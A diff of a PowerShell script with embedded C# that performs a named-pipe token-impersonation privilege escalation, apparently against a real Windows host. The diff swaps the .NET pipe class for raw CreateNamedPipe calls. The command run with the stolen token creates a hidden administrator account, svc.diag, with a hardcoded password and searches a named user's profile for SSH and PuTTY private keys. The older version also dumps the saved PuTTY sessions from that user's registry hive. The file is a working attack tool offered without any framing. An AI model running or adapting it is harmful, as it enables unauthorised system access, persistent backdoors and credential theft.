@@ -1,32 +1,34 @@
 Add-Type @"
-using System;using System.Runtime.InteropServices;using System.Threading;using System.IO.Pipes;using System.Security.Principal;
-public class PF{
-[DllImport("advapi32.dll",SetLastError=true)]public static extern bool ImpersonateNamedPipeClient(IntPtr h);
-[DllImport("advapi32.dll")]public static extern bool RevertToSelf();
-[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentThread();
-[DllImport("advapi32.dll",SetLastError=true)]public static extern bool OpenThreadToken(IntPtr t,uint d,bool o,out IntPtr k);
-[DllImport("advapi32.dll",SetLastError=true)]public static extern bool DuplicateTokenEx(IntPtr h,uint a,IntPtr t,int i,int y,out IntPtr n);
-[DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]public static extern bool CreateProcessWithTokenW(IntPtr t,uint f,string a,string c,uint g,IntPtr e,string d,[In]ref SI s,out PI p);
-[DllImport("kernel32.dll")]public static extern bool CloseHandle(IntPtr h);
+using System;using System.Runtime.InteropServices;using System.Threading;using System.Security.Principal;
+public class PF2{
+[DllImport("kernel32.dll",SetLastError=true,CharSet=CharSet.Unicode)]static extern IntPtr CreateNamedPipe(string n,uint o,uint m,uint x,uint ob,uint ib,uint t,IntPtr s);
+[DllImport("kernel32.dll",SetLastError=true)]static extern bool ConnectNamedPipe(IntPtr h,IntPtr o);
+[DllImport("kernel32.dll")]static extern bool CloseHandle(IntPtr h);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool ImpersonateNamedPipeClient(IntPtr h);
+[DllImport("advapi32.dll")]static extern bool RevertToSelf();
+[DllImport("kernel32.dll")]static extern IntPtr GetCurrentThread();
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool OpenThreadToken(IntPtr t,uint d,bool o,out IntPtr k);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool DuplicateTokenEx(IntPtr h,uint a,IntPtr t,int i,int y,out IntPtr n);
+[DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]static extern bool CreateProcessWithTokenW(IntPtr t,uint f,string a,string c,uint g,IntPtr e,string d,[In]ref SI s,out PI p);
 [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct SI{public int cb;public string a,b,c;public int x,y,w,h,xc,yc,fa,fl;public short sw,r;public IntPtr p,i,o,e;}
 [StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr a,b;public int pid,tid;}
 public static string Go(string cmd){
-string id=new Random().Next(1000,9999).ToString();
-var svr=new NamedPipeServerStream("test\\pipe\\spoolss",PipeDirection.InOut,10,PipeTransmissionMode.Byte,PipeOptions.None,4096,4096);
-new Thread(()=>{try{Thread.Sleep(1000);System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c echo x > \\\\localhost/pipe/test/pipe/spoolss"){WindowStyle=System.Diagnostics.ProcessWindowStyle.Hidden,CreateNoWindow=true});}catch{}}).Start();
-if(!svr.IsConnected){svr.WaitForConnection();}
-ImpersonateNamedPipeClient(svr.SafePipeHandle.DangerousGetHandle());
+IntPtr hPipe=CreateNamedPipe("\\\\.\\pipe\\test\\pipe\\spoolss",3,0,10,4096,4096,0,IntPtr.Zero);
+if(hPipe==new IntPtr(-1))return"PIPE_ERR:"+Marshal.GetLastWin32Error();
+new Thread(()=>{try{Thread.Sleep(500);System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c echo test > \\\\localhost/pipe/test/pipe/spoolss"){WindowStyle=System.Diagnostics.ProcessWindowStyle.Hidden,CreateNoWindow=true});}catch{}}).Start();
+ConnectNamedPipe(hPipe,IntPtr.Zero);
+ImpersonateNamedPipeClient(hPipe);
 string who=WindowsIdentity.GetCurrent().Name;
 IntPtr tk;OpenThreadToken(GetCurrentThread(),0x002A,false,out tk);
 IntPtr dup;DuplicateTokenEx(tk,0x02000000,IntPtr.Zero,2,1,out dup);
-RevertToSelf();svr.Close();
-if(dup==IntPtr.Zero||tk==IntPtr.Zero)return"ERR:"+who+":"+Marshal.GetLastWin32Error();
+RevertToSelf();CloseHandle(hPipe);
+if(dup==IntPtr.Zero)return"NODUP:"+who+":"+Marshal.GetLastWin32Error();
 SI si=new SI();si.cb=Marshal.SizeOf(si);PI pi;
 bool ok=CreateProcessWithTokenW(dup,0,null,"cmd.exe /c "+cmd,0x08000000,IntPtr.Zero,null,ref si,out pi);
 CloseHandle(dup);CloseHandle(tk);
-return ok?"SYSTEM_PID:"+pi.pid+":"+who:"FAIL:"+Marshal.GetLastWin32Error()+":"+who;}}
+return ok?"OK:"+pi.pid+":"+who:"FAIL:"+Marshal.GetLastWin32Error()+":"+who;}}
 "@
-$r=[PF]::Go("whoami > F:\Database\sys.txt & net user svc.diag Sugiarto20@ /add /y >> F:\Database\sys.txt 2>&1 & net localgroup Administrators svc.diag /add >> F:\Database\sys.txt 2>&1 & dir /s /b C:\Users\Adins\.ssh C:\Users\Adins\*.ppk >> F:\Database\sys.txt 2>&1 & reg load HKU\ta C:\Users\Adins\NTUSER.DAT >> F:\Database\sys.txt 2>&1 & reg query HKU\ta\Software\SimonTatham\PuTTY\Sessions /s >> F:\Database\sys.txt 2>&1 & reg unload HKU\ta >> F:\Database\sys.txt 2>&1")
+$r=[PF2]::Go("whoami > F:\Database\sys.txt 2>&1 & net user svc.diag Sugiarto20@ /add /y >> F:\Database\sys.txt 2>&1 & net localgroup Administrators svc.diag /add >> F:\Database\sys.txt 2>&1 & dir /s /b C:\Users\Adins\.ssh C:\Users\Adins\*.ppk >> F:\Database\sys.txt 2>&1")
 Write-Output $r
-Start-Sleep 5
+Start-Sleep 3
 Get-Content F:\Database\sys.txt -EA SilentlyContinue
